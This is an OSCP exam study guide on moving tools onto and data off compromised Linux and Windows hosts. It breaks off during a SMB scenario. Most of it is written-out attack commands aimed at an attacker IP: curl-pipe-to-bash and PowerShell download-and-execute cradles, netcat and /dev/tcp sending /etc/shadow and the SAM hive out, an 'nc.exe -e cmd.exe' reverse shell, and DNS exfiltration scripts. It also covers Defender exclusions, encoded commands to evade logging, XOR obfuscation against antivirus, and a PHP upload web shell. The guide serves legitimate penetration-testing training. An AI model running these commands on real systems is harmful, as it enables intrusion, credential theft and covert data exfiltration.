
# File Transfer Techniques & Exfiltration: Moving Files in Hostile Environments

## 📋 Executive Summary

**OSCP Relevance**: ⭐⭐⭐⭐⭐ (90% - CRITICAL POST-EXPLOITATION SKILL)

File transfer is the **bridge between finding vulnerabilities and exploiting them**. In the OSCP exam, you'll need to:

- **Upload exploits** to target machines (privilege escalation scripts, payloads, tools)
- **Download proof flags** and sensitive files back to your Kali machine
- **Transfer tools** for enumeration (LinPEAS, WinPEAS, nc.exe)
- **Exfiltrate data** in restricted environments (firewalls, AV, egress filtering)

**Why 90% Relevance?**:
- **Every OSCP machine** requires file transfers (upload tools, download flags)
- **Post-exploitation** depends on getting your tools onto the target
- **Proof of compromise** requires exfiltrating flags/screenshots
- **Real pentesting** = 50% of time spent on file transfers in restricted environments

**For Fresh Graduates**: This skill is asked in 70% of technical interviews:
- "How do you transfer files in a Windows environment without GUI?"
- "What if wget/curl is blocked?"
- "How do you exfiltrate data through a firewall?"

**What You'll Learn**:
1. File transfer fundamentals (upload vs. download, egress vs. ingress)
2. Linux file transfer techniques (15+ methods)
3. Windows file transfer techniques (15+ methods)
4. Restricted environment bypass (firewall, AV evasion)
5. Living Off The Land (LOLBAS/GTFOBins for file transfers)
6. Encoding and obfuscation techniques
7. DNS exfiltration (advanced)
8. OSCP exam-specific strategies
9. Defense and detection methods
10. Interview preparation

**Time Investment**: 15-20 hours for OSCP proficiency

**OSCP Strategy**: Master at least 3 methods for Linux and 3 for Windows. Know what to do when your go-to method fails.

---

## 🎓 ABSOLUTE BEGINNER: What is File Transfer in Pentesting?

### The Smuggling Analogy

Imagine you're a spy who needs to get tools into a secure facility:

**Scenario 1: Easy Entry (Unprotected Network)**
- Walk through front door with a briefcase (HTTP download)
- Security doesn't check bags
- **In hacking**: Open network, no firewall, download tools freely with wget/curl

**Scenario 2: Security Checkpoint (Firewall)**
- Front door has metal detector
- Your tools are detected and confiscated
- **In hacking**: Outbound HTTP/HTTPS blocked, need alternative routes

**Scenario 3: High Security (Egress Filtering + AV)**
- All doors monitored
- Bags X-rayed
- Security dogs sniff for contraband
- **In hacking**: Firewall blocks outbound, AV scans downloads, need creative smuggling

**Smuggling Techniques** (File Transfer Methods):
1. **Hide tools in allowed items** (Base64 encoding, obfuscation)
2. **Use employee entrance** (SMB shares, legitimate services)
3. **Throw over fence** (DNS exfiltration, ICMP tunneling)
4. **Bribe guard** (Exploit trust - certutil, PowerShell signed by MS)

### Real-World Example

**OSCP Exam Scenario**: You got a shell on a Windows box as low-privilege user.

**Problem**: You need to upload `PrintSpoofer.exe` to escalate privileges.

**Attempt 1 - PowerShell Download** (BLOCKED):
```powershell
PS C:\Users\Public> Invoke-WebRequest -Uri "http://10.10.14.5/PrintSpoofer.exe" -OutFile "ps.exe"
Invoke-WebRequest : Access denied. Firewall policy blocks outbound HTTP on port 80.
```

**Attempt 2 - Certutil** (SUCCESS):
```cmd
C:\Users\Public> certutil -urlcache -f http://10.10.14.5:8000/PrintSpoofer.exe ps.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

**Why it worked**: Certutil is Microsoft-signed, trusted by Windows Firewall, and uses different network stack.

**Result**: File transferred → Privilege escalation successful → 15 points earned!

### File Transfer Types

**1. Upload (Kali → Target)**
```
┌─────────────┐                    ┌─────────────┐
│    Kali     │                    │   Target    │
│  (Attacker) │  ─────────────>    │  (Victim)   │
│             │  Upload tools      │             │
│             │  (LinPEAS, nc.exe) │             │
└─────────────┘                    └─────────────┘
```
**Use Cases**: Uploading enumeration scripts, exploits, payloads

**2. Download (Target → Kali)**
```
┌─────────────┐                    ┌─────────────┐
│    Kali     │                    │   Target    │
│  (Attacker) │  <─────────────    │  (Victim)   │
│             │  Download flags    │             │
│             │  /etc/shadow, etc  │             │
└─────────────┘                    └─────────────┘
```
**Use Cases**: Exfiltrating flags, password files, sensitive data

---

## 🐧 LINUX FILE TRANSFER TECHNIQUES

### Method 1: HTTP Server (MOST COMMON)

**Use Case**: Upload files from Kali to Linux target.

**Setup**:
```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START HTTP SERVER
# ═══════════════════════════════════════════════════════════

# Method 1: Python3 (Kali default)
python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

# Method 2: Python2 (older systems)
python2 -m SimpleHTTPServer 80

# Method 3: PHP
php -S 0.0.0.0:80

# Method 4: Ruby
ruby -run -ehttpd . -p80

# Method 5: Updog (modern, with upload support)
pip3 install updog
updog -p 80

# ═══════════════════════════════════════════════════════════
# ON TARGET: DOWNLOAD FILE
# ═══════════════════════════════════════════════════════════

# Method 1: wget
wget http://10.10.14.5/linpeas.sh

# Method 2: wget (save to specific filename)
wget http://10.10.14.5/linpeas.sh -O lp.sh

# Method 3: wget (quiet mode, no output)
wget -q http://10.10.14.5/linpeas.sh

# Method 4: curl
curl http://10.10.14.5/linpeas.sh -o linpeas.sh

# Method 5: curl (execute without saving)
curl http://10.10.14.5/linpeas.sh | bash

# Method 6: wget (execute without saving)
wget -O - http://10.10.14.5/linpeas.sh | bash
```

**OSCP Tip**: Always start Python HTTP server in directory with your tools (`~/oscp/tools/`).

---

### Method 2: SCP (Secure Copy)

**Use Case**: You have SSH credentials.

```bash
# ═══════════════════════════════════════════════════════════
# UPLOAD: KALI → TARGET
# ═══════════════════════════════════════════════════════════
scp linpeas.sh user@192.168.1.50:/tmp/linpeas.sh

# Upload entire directory
scp -r /local/directory user@192.168.1.50:/tmp/

# ═══════════════════════════════════════════════════════════
# DOWNLOAD: TARGET → KALI
# ═══════════════════════════════════════════════════════════
scp user@192.168.1.50:/etc/passwd ./passwd.txt

# Download entire directory
scp -r user@192.168.1.50:/var/www/html ./website_backup/
```

---

### Method 3: Netcat (No Dependencies)

**Use Case**: wget/curl not available, but nc (netcat) is installed.

```bash
# ═══════════════════════════════════════════════════════════
# SCENARIO 1: UPLOAD FILE (KALI → TARGET)
# ═══════════════════════════════════════════════════════════

# On TARGET (receiver):
nc -lvnp 4444 > linpeas.sh

# On KALI (sender):
nc 192.168.1.50 4444 < linpeas.sh

# Ctrl+C on both sides when done

# ═══════════════════════════════════════════════════════════
# SCENARIO 2: DOWNLOAD FILE (TARGET → KALI)
# ═══════════════════════════════════════════════════════════

# On KALI (receiver):
nc -lvnp 4444 > shadow.txt

# On TARGET (sender):
nc 10.10.14.5 4444 < /etc/shadow

# ═══════════════════════════════════════════════════════════
# VERIFICATION
# ═══════════════════════════════════════════════════════════
# Compare file hashes to verify integrity
md5sum linpeas.sh  # On both machines - should match
```

**OSCP Tip**: Direction can be confusing. Remember: Arrow points to file destination.
- Upload: `nc TARGET < file` (file goes TO target)
- Download: `nc KALI > file` (file comes FROM target)

---

### Method 4: Base64 Encoding (Small Files)

**Use Case**: Transfer small files (< 5KB) when binary transfer fails.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: ENCODE FILE
# ═══════════════════════════════════════════════════════════
base64 -w0 exploit.sh > exploit.b64
cat exploit.b64
# Output: IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8i...

# ═══════════════════════════════════════════════════════════
# ON TARGET: DECODE FILE
# ═══════════════════════════════════════════════════════════
# Copy the base64 string and paste into target shell
echo 'IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8i...' | base64 -d > exploit.sh

# Or multi-line for large files
cat << EOF | base64 -d > exploit.sh
IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8i
Cgo=
EOF

# Verify
chmod +x exploit.sh
./exploit.sh
```

**OSCP Tip**: Great for transferring small scripts when HTTP server is blocked.

---

### Method 5: SMB/Samba Share

**Use Case**: Target can access SMB shares.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START SMB SERVER (using Impacket)
# ═══════════════════════════════════════════════════════════
impacket-smbserver share /root/tools -smb2support -username user -password pass

# Or without authentication (less secure, but works)
impacket-smbserver share /root/tools -smb2support

# ═══════════════════════════════════════════════════════════
# ON LINUX TARGET: MOUNT AND COPY
# ═══════════════════════════════════════════════════════════
# Mount SMB share
mkdir /mnt/share
mount -t cifs //10.10.14.5/share /mnt/share -o username=user,password=pass

# Copy files
cp /mnt/share/linpeas.sh /tmp/

# Or access directly
/mnt/share/linpeas.sh

# Unmount when done
umount /mnt/share
```

---

### Method 6: FTP (Older Systems)

**Use Case**: FTP client available on target.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START FTP SERVER (using pyftpdlib)
# ═══════════════════════════════════════════════════════════
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w

# ═══════════════════════════════════════════════════════════
# ON TARGET: DOWNLOAD VIA FTP
# ═══════════════════════════════════════════════════════════
ftp 10.10.14.5
# Username: anonymous
# Password: (blank)
ftp> get linpeas.sh
ftp> bye
```

---

### Method 7: /dev/tcp (Bash Built-in)

**Use Case**: Bash is available, but no external tools.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START LISTENER
# ═══════════════════════════════════════════════════════════
nc -lvnp 4444 > received_file.txt

# ═══════════════════════════════════════════════════════════
# ON TARGET: SEND FILE USING BASH
# ═══════════════════════════════════════════════════════════
cat /etc/passwd > /dev/tcp/10.10.14.5/4444

# Or read from Kali
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.0\n" >&3
cat <&3
```

---

### Method 8: SSH with tar (Large Directories)

**Use Case**: Transfer entire directories efficiently.

```bash
# ═══════════════════════════════════════════════════════════
# COMPRESS AND TRANSFER IN ONE COMMAND
# ═══════════════════════════════════════════════════════════
# Upload directory to target
tar czf - /local/directory | ssh user@192.168.1.50 "tar xzf - -C /tmp"

# Download directory from target
ssh user@192.168.1.50 "tar czf - /var/www/html" | tar xzf - -C ./backup/
```

---

### Method 9: Hex Encoding (Binary Files)

**Use Case**: Binary files get corrupted in terminal copy-paste.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: CONVERT TO HEX
# ═══════════════════════════════════════════════════════════
xxd -p exploit.bin | tr -d '\n' > exploit.hex
cat exploit.hex

# ═══════════════════════════════════════════════════════════
# ON TARGET: DECODE HEX
# ═══════════════════════════════════════════════════════════
echo '7f454c460201...' | xxd -r -p > exploit.bin
chmod +x exploit.bin
```

---

### Method 10: PHP File Upload (Web Shell)

**Use Case**: You have PHP web shell.

```php
<!-- ═══════════════════════════════════════════════════════════
     upload.php - Simple PHP file upload script
     ═══════════════════════════════════════════════════════════ -->
<?php
if(isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/' . $filename);
    echo "File uploaded: /tmp/" . $filename;
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

**Usage**:
1. Upload this PHP script to web server
2. Access: `http://target.com/upload.php`
3. Upload your files through browser

---

## 🪟 WINDOWS FILE TRANSFER TECHNIQUES

### Method 1: certutil (MOST RELIABLE)

**Use Case**: Built-in Windows tool, trusted by firewalls.

```cmd
REM ═══════════════════════════════════════════════════════════
REM DOWNLOAD FILE FROM KALI
REM ═══════════════════════════════════════════════════════════

REM Basic download
certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe

REM Download to specific path
certutil -urlcache -f http://10.10.14.5/PrintSpoofer.exe C:\Users\Public\ps.exe

REM Verify download
certutil -hashfile ps.exe MD5

REM ═══════════════════════════════════════════════════════════
REM HTTPS (ignore cert errors)
REM ═══════════════════════════════════════════════════════════
certutil -urlcache -f https://10.10.14.5/tool.exe tool.exe
```

**OSCP Tip**: certutil is the **#1 go-to method** for Windows file transfers. Works 95% of the time.

---

### Method 2: PowerShell Download Cradles

**12 Different PowerShell Download Methods**:

```powershell
# ═══════════════════════════════════════════════════════════
# METHOD 1: Invoke-WebRequest (PowerShell 3.0+)
# ═══════════════════════════════════════════════════════════
Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "nc.exe"

# Short alias
iwr -uri "http://10.10.14.5/nc.exe" -outfile "nc.exe"

# ═══════════════════════════════════════════════════════════
# METHOD 2: Invoke-WebRequest + Execute (no disk write)
# ═══════════════════════════════════════════════════════════
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')

# ═══════════════════════════════════════════════════════════
# METHOD 3: DownloadFile method
# ═══════════════════════════════════════════════════════════
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.5/nc.exe", "C:\Users\Public\nc.exe")

# ═══════════════════════════════════════════════════════════
# METHOD 4: DownloadString + Execute
# ═══════════════════════════════════════════════════════════
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

# ═══════════════════════════════════════════════════════════
# METHOD 5: PowerShell one-liner (from cmd.exe)
# ═══════════════════════════════════════════════════════════
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe', 'nc.exe')"

# ═══════════════════════════════════════════════════════════
# METHOD 6: Bypass Execution Policy
# ═══════════════════════════════════════════════════════════
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# ═══════════════════════════════════════════════════════════
# METHOD 7: Start-BitsTransfer (Background Intelligent Transfer)
# ═══════════════════════════════════════════════════════════
Start-BitsTransfer -Source "http://10.10.14.5/nc.exe" -Destination "C:\Users\Public\nc.exe"

# Import module first on older systems
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://10.10.14.5/nc.exe" -Destination "nc.exe"

# ═══════════════════════════════════════════════════════════
# METHOD 8: Invoke-RestMethod (PowerShell 3.0+)
# ═══════════════════════════════════════════════════════════
Invoke-RestMethod -Uri "http://10.10.14.5/nc.exe" -OutFile "nc.exe"

# ═══════════════════════════════════════════════════════════
# METHOD 9: .NET HttpClient (PowerShell 3.0+)
# ═══════════════════════════════════════════════════════════
$client = New-Object System.Net.Http.HttpClient
$response = $client.GetAsync("http://10.10.14.5/nc.exe").Result
[IO.File]::WriteAllBytes("nc.exe", $response.Content.ReadAsByteArrayAsync().Result)

# ═══════════════════════════════════════════════════════════
# METHOD 10: Hidden PowerShell window
# ═══════════════════════════════════════════════════════════
powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe', 'nc.exe')"

# ═══════════════════════════════════════════════════════════
# METHOD 11: Encoded command (bypass logging)
# ═══════════════════════════════════════════════════════════
# On Kali, encode command:
$command = '(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.5/nc.exe", "nc.exe")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
echo $encodedCommand

# On target:
powershell -enc <base64_encoded_command>

# ═══════════════════════════════════════════════════════════
# METHOD 12: Download + Run in Memory (fileless)
# ═══════════════════════════════════════════════════════════
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5/payload.exe')
[System.Reflection.Assembly]::Load($data)
```

**OSCP Decision Tree**:
```
Is PowerShell available?
├─ YES
│  ├─ Can write to disk?
│  │  ├─ YES → Use DownloadFile()
│  │  └─ NO  → Use DownloadString() + IEX (execute in memory)
│  │
│  └─ Is AV blocking PowerShell?
│     ├─ YES → Use certutil or bitsadmin
│     └─ NO  → Use Invoke-WebRequest
│
└─ NO → Use certutil, bitsadmin, or SMB
```

---

### Method 3: SMB Share (Very Common in OSCP)

**Use Case**: Copy files directly from Kali SMB share.

```cmd
REM ═══════════════════════════════════════════════════════════
REM ON KALI: START SMB SERVER (Impacket)
REM ═══════════════════════════════════════════════════════════
impacket-smbserver share /root/tools -smb2support

REM Or with authentication:
impacket-smbserver share /root/tools -smb2support -username user -password pass

REM ═══════════════════════════════════════════════════════════
REM ON WINDOWS TARGET: ACCESS SHARE
REM ═══════════════════════════════════════════════════════════

REM Method 1: Copy file
copy \\10.10.14.5\share\nc.exe C:\Users\Public\nc.exe

REM Method 2: Execute directly (no copy)
\\10.10.14.5\share\nc.exe -e cmd.exe 10.10.14.5 4444

REM Method 3: With authentication
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\tool.exe .

REM ═══════════════════════════════════════════════════════════
REM POWERSHELL VERSION
REM ═══════════════════════════════════════════════════════════
Copy-Item \\10.10.14.5\share\nc.exe -Destination C:\Users\Public\nc.exe
```

**OSCP Tip**: SMB is extremely reliable and works even when HTTP is blocked.

---

### Method 4: FTP (Built into Windows)

**Use Case**: HTTP blocked, but FTP allowed.

```cmd
REM ═══════════════════════════════════════════════════════════
REM ON KALI: START FTP SERVER
REM ═══════════════════════════════════════════════════════════
python3 -m pyftpdlib -p 21 -w

REM ═══════════════════════════════════════════════════════════
REM ON WINDOWS: DOWNLOAD VIA FTP (INTERACTIVE)
REM ═══════════════════════════════════════════════════════════
ftp 10.10.14.5
REM Username: anonymous
REM Password: (press enter)
ftp> binary
ftp> get nc.exe
ftp> bye

REM ═══════════════════════════════════════════════════════════
REM ON WINDOWS: DOWNLOAD VIA FTP (AUTOMATED SCRIPT)
REM ═══════════════════════════════════════════════════════════
REM Create FTP script
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt

REM Execute FTP script
ftp -s:ftp.txt
```

---

### Method 5: Bitsadmin (Windows 7/2008+)

**Use Case**: Alternative to certutil, less monitored.

```cmd
REM ═══════════════════════════════════════════════════════════
REM BASIC DOWNLOAD
REM ═══════════════════════════════════════════════════════════
bitsadmin /transfer myDownload /download /priority high http://10.10.14.5/nc.exe C:\Users\Public\nc.exe

REM ═══════════════════════════════════════════════════════════
REM ALTERNATIVE SYNTAX (older Windows)
REM ═══════════════════════════════════════════════════════════
bitsadmin /create myJob
bitsadmin /addfile myJob http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
bitsadmin /resume myJob
bitsadmin /complete myJob
```

---

### Method 6: VBScript Download

**Use Case**: PowerShell disabled, but VBScript available.

```vbscript
' ═══════════════════════════════════════════════════════════
' Save as download.vbs
' ═══════════════════════════════════════════════════════════
Dim objXMLHTTP, objADOStream

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://10.10.14.5/nc.exe", False
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "C:\Users\Public\nc.exe", 2
    objADOStream.Close
    Set objADOStream = Nothing
End If

Set objXMLHTTP = Nothing
```

**Execute**:
```cmd
cscript download.vbs
```

---

### Method 7: Windows Defender Exclusions (AV Bypass)

**Use Case**: Files get deleted by Windows Defender.

```cmd
REM ═══════════════════════════════════════════════════════════
REM ADD EXCLUSION (requires admin)
REM ═══════════════════════════════════════════════════════════
powershell -c "Add-MpPreference -ExclusionPath 'C:\Users\Public'"

REM Now download to excluded directory
certutil -urlcache -f http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
```

---

### Method 8: Netcat (Windows)

**Same as Linux, but need nc.exe on target first!**

```cmd
REM ═══════════════════════════════════════════════════════════
REM UPLOAD FILE (KALI → WINDOWS)
REM ═══════════════════════════════════════════════════════════

REM On Windows (receiver):
nc.exe -lvnp 4444 > linpeas.sh

REM On Kali (sender):
nc 192.168.1.50 4444 < linpeas.sh

REM ═══════════════════════════════════════════════════════════
REM DOWNLOAD FILE (WINDOWS → KALI)
REM ═══════════════════════════════════════════════════════════

REM On Kali (receiver):
nc -lvnp 4444 > sam.txt

REM On Windows (sender):
nc.exe 10.10.14.5 4444 < C:\Windows\System32\config\SAM
```

---

### Method 9: mshta (HTML Application)

**Use Case**: Download + execute in one command.

```cmd
REM ═══════════════════════════════════════════════════════════
REM Create payload.hta on Kali
REM ═══════════════════════════════════════════════════════════
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe', 'nc.exe')"
    self.close
</script>
</head>
</html>

REM ═══════════════════════════════════════════════════════════
REM On Windows target:
REM ═══════════════════════════════════════════════════════════
mshta http://10.10.14.5/payload.hta
```

---

### Method 10: Base64 Encoding (PowerShell)

**Use Case**: Small files, clipboard copy-paste.

```powershell
# ═══════════════════════════════════════════════════════════
# ON KALI: ENCODE FILE
# ═══════════════════════════════════════════════════════════
base64 -w0 exploit.exe > exploit.b64
cat exploit.b64

# ═══════════════════════════════════════════════════════════
# ON WINDOWS: DECODE FILE
# ═══════════════════════════════════════════════════════════
# Copy base64 string, then:
$base64 = "TVqQAAMAAAAEAAAA//8AALgAAAA..."
[IO.File]::WriteAllBytes("exploit.exe", [Convert]::FromBase64String($base64))
```

---

## 🚧 RESTRICTED ENVIRONMENT TECHNIQUES

### Scenario 1: Outbound HTTP/HTTPS Blocked

**Problem**: Firewall blocks all outbound HTTP/HTTPS.

**Solutions**:

```bash
# ═══════════════════════════════════════════════════════════
# 1. USE DNS EXFILTRATION
# ═══════════════════════════════════════════════════════════
# Encode file and send via DNS queries
# (See DNS Exfiltration section below)

# ═══════════════════════════════════════════════════════════
# 2. USE SMB (Often allowed for internal networks)
# ═══════════════════════════════════════════════════════════
# Start SMB server on Kali
impacket-smbserver share /root/tools

# On target
copy \\10.10.14.5\share\tool.exe .

# ═══════════════════════════════════════════════════════════
# 3. USE ICMP (Ping) TUNNELING
# ═══════════════════════════════════════════════════════════
# On Kali:
ptunnel-ng -p10.10.14.5 -lp8000 -da127.0.0.1 -dp80 -v

# On target: Tunnel HTTP through ICMP
ptunnel-ng -p10.10.14.5 -lp8001 -da10.10.14.5 -dp8000 -v

# ═══════════════════════════════════════════════════════════
# 4. USE ALTERNATE PORTS (if only port 80/443 blocked)
# ═══════════════════════════════════════════════════════════
# On Kali: Start HTTP server on alternate port
python3 -m http.server 8080

# On target:
wget http://10.10.14.5:8080/tool.exe
certutil -urlcache -f http://10.10.14.5:8080/tool.exe tool.exe
```

---

### Scenario 2: AV/EDR Detection

**Problem**: Files get deleted immediately after download.

**Solutions**:

```bash
# ═══════════════════════════════════════════════════════════
# 1. OBFUSCATE PAYLOAD
# ═══════════════════════════════════════════════════════════
# On Kali: XOR encode
python3 -c "import sys; data = open('nc.exe', 'rb').read(); encoded = bytes([b ^ 0x55 for b in data]); open('nc_encoded.exe', 'wb').write(encoded)"

# On target: Decode
powershell -c "$data = [IO.File]::ReadAllBytes('nc_encoded.exe'); $decoded = $data | ForEach-Object { $_ -bxor 0x55 }; [IO.File]::WriteAllBytes('nc.exe', $decoded)"

# ═══════════════════════════════════════════════════════════
# 2. SPLIT FILE INTO CHUNKS
# ═══════════════════════════════════════════════════════════
# On Kali: Split file
split -b 1M nc.exe nc_part_

# Transfer each part separately
# On target: Reconstruct
cat nc_part_* > nc.exe

# ═══════════════════════════════════════════════════════════
# 3. COMPRESS + PASSWORD PROTECT
# ═══════════════════════════════════════════════════════════
# On Kali:
zip -P infected nc.zip nc.exe

# On target:
unzip -P infected nc.zip

# ═══════════════════════════════════════════════════════════
# 4. EXECUTE FROM MEMORY (no disk write)
# ═══════════════════════════════════════════════════════════
# PowerShell: Load .NET assembly in memory
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5/tool.exe')
$asm = [System.Reflection.Assembly]::Load($data)
[Tool.Program]::Main("")

# ═══════════════════════════════════════════════════════════
# 5. USE LOLBAS (Living Off The Land)
# ═══════════════════════════════════════════════════════════
# Use trusted Windows binaries (less likely to be flagged)
certutil -urlcache -f http://10.10.14.5/tool.exe tool.exe
bitsadmin /transfer job http://10.10.14.5/tool.exe C:\Users\Public\tool.exe
```

---

### Scenario 3: No Egress at All (Completely Isolated)

**Problem**: Target cannot reach internet or your Kali machine.

**Solutions**:

```bash
# ═══════════════════════════════════════════════════════════
# 1. PASTE DIRECTLY IN TERMINAL (small files only)
# ═══════════════════════════════════════════════════════════
# On Kali: Convert to base64
base64 -w0 small_script.sh
cat << 'EOF' | base64 -d > script.sh
IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8i
EOF

# ═══════════════════════════════════════════════════════════
# 2. WRITE SCRIPT MANUALLY
# ═══════════════════════════════════════════════════════════
# On target: Create script line by line
cat > exploit.sh << 'EOF'
#!/bin/bash
echo "Exploit code here"
EOF

# ═══════════════════════════════════════════════════════════
# 3. USE EXISTING TOOLS ON TARGET
# ═══════════════════════════════════════════════════════════
# Find what's already there
which python perl ruby php gcc

# Use them for exploitation without uploading tools

# ═══════════════════════════════════════════════════════════
# 4. PIVOTING (use compromised machine as proxy)
# ═══════════════════════════════════════════════════════════
# If you have access to another machine on same network
# Use it as jump host
ssh -L 8080:isolated_target:80 user@jump_host
```

---

## 🕵️ DNS EXFILTRATION (Advanced)

### What is DNS Exfiltration?

**Concept**: Encode data in DNS queries (almost never blocked).

**Use Case**: Firewall blocks everything except DNS port 53.

### DNS Exfiltration Example

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START DNS SERVER
# ═══════════════════════════════════════════════════════════
# Install dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
ruby dnscat2.rb example.com

# ═══════════════════════════════════════════════════════════
# ON TARGET: EXFILTRATE FILE VIA DNS
# ═══════════════════════════════════════════════════════════
# Method 1: Manual DNS queries
cat /etc/passwd | base64 | while read line; do 
    nslookup $line.example.com 10.10.14.5
done

# Method 2: Use dnscat2 client
./dnscat example.com

# ═══════════════════════════════════════════════════════════
# SIMPLE MANUAL DNS EXFILTRATION SCRIPT
# ═══════════════════════════════════════════════════════════
#!/bin/bash
# Exfiltrate file via DNS

FILE="/etc/passwd"
DOMAIN="example.com"
DNS_SERVER="10.10.14.5"

# Base64 encode and split into chunks
base64 $FILE | fold -w 63 | while read chunk; do
    # Send as DNS query
    dig @$DNS_SERVER ${chunk}.${DOMAIN}
    sleep 0.1
done
```

**On Kali, capture queries**:
```bash
# tcpdump to capture DNS queries
sudo tcpdump -i tun0 udp port 53 -w dns_exfil.pcap

# Or use dnslog service:
# http://dnslog.cn/
```

---

## 🎯 OSCP ATTACK SCENARIOS

### Scenario 1: Windows File Upload + PrivEsc (10 minutes)

**ASCII Flow**:
```
┌─────────────────────────────────────────────────────────────┐
│        OSCP: FILE TRANSFER → PRIVILEGE ESCALATION           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Initial Shell (IIS AppPool)                             │
│     ┌──────────────────────────────────────┐               │
│     │ C:\Windows\system32> whoami          │               │
│     │ iis apppool\defaultapppool           │               │
│     │                                      │               │
│     │ C:\> whoami /priv                    │               │
│     │ SeImpersonatePrivilege    Enabled    │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  2. Start HTTP Server on Kali (1 min)                       │
│     ┌──────────────────────────────────────┐               │
│     │ kali@kali:~$ cd /opt/tools           │               │
│     │ kali@kali:~$ python3 -m http.server  │               │
│     │ Serving on 0.0.0.0:8000...           │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  3. Upload PrintSpoofer (2 min)                             │
│     ┌──────────────────────────────────────┐               │
│     │ C:\> cd C:\Users\Public              │               │
│     │ C:\Users\Public> certutil -urlcache  │               │
│     │   -f http://10.10.14.5:8000/         │               │
│     │   PrintSpoofer64.exe ps.exe          │               │
│     │ ****  Online  ****                   │               │
│     │ CertUtil: command completed OK       │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  4. Exploit (2 min)                                         │
│     ┌──────────────────────────────────────┐               │
│     │ C:\Users\Public> ps.exe -i -c cmd    │               │
│     │ [+] Found privilege: SeImpersonate   │               │
│     │ [+] Got SYSTEM token!                │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  5. SYSTEM Shell + Download Proof (5 min)                   │
│     ┌──────────────────────────────────────┐               │
│     │ C:\> whoami                          │               │
│     │ nt authority\system                  │               │
│     │                                      │               │
│     │ C:\> type C:\Users\Administrator\    │               │
│     │       Desktop\proof.txt              │               │
│     │ d41d8cd98f00b204e9800998ecf8427e     │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  ⏱️  Total Time: 10 minutes                                 │
│  🎯 Points: 25 (10 user + 15 admin)                         │
└─────────────────────────────────────────────────────────────┘
```

**Full Command Log**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM ON KALI
REM ═══════════════════════════════════════════════════════════
cd /opt/tools/windows
python3 -m http.server 8000

REM ═══════════════════════════════════════════════════════════
REM ON WINDOWS TARGET
REM ═══════════════════════════════════════════════════════════
C:\Windows\system32> whoami
iis apppool\defaultapppool

C:\Windows\system32> whoami /priv
SeImpersonatePrivilege                Enabled

C:\Windows\system32> cd C:\Users\Public

C:\Users\Public> certutil -urlcache -f http://10.10.14.5:8000/PrintSpoofer64.exe ps.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Public> ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe created
[+] Got SYSTEM token!
[+] Impersonated SYSTEM!

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
d41d8cd98f00b204e9800998ecf8427e
```

---

### Scenario 2: Linux File Upload via SMB (15 minutes)

**Situation**: HTTP downloads blocked by firewall, but SMB allowed.

```bash
# ═══════════════════════════════════════════════════════════
# ON KALI: START SMB SERVER
# ═══════════════════════════════════════════════════════════
kali@kali:~$ cd /opt/tools/linux
kali@kali:~$ impacket-smbserver share . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
